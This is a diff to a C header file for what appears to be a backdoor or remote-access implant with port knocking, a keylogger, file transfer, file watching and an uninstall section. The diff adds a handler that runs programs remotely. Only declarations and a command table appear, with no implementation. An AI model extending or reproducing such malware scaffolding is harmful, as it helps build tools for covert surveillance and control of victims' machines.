@@ -8,6 +8,7 @@
 #define RECEIVING_PORT 8080
 #define PORT_KNOCKING_PORT 30
 #define INITIAL_IP 10
+#define MESSAGE_BUFFER_LENGTH 1024
 
 struct server_options;
 
@@ -55,12 +56,14 @@ typedef struct {
 // Handler Functions
 void start_keylogger(struct session_info * session_info);
 void stop_keylogger(struct session_info * session_info);
+void process_run_command(struct session_info * session_info);
 void process_receive_file(struct session_info * session_info);
 
 //  Map of command codes and handler functions
 static const key_pair command_handler_functions[] = {
     { START_KEYLOGGER,  start_keylogger },
     { STOP_KEYLOGGER, stop_keylogger },
+    { RUN_PROGRAM, process_run_command },
     { RECEIVE_FILE, process_receive_file },
     { 0, NULL }
 };
@@ -81,12 +84,12 @@ enum FILE_TYPE {
 };
 
 void send_file(struct server_options * server_options);
-void receive_file(const struct server_options * server_options);
+void send_receive_file(const struct server_options * server_options);
 void send_watch(int fd, enum FILE_TYPE file_type, char * path);
 
 
 // Run program
-void send_run_program(int fd);
+void send_run_program(const struct server_options * server_options);
 
 
 // Uninstall
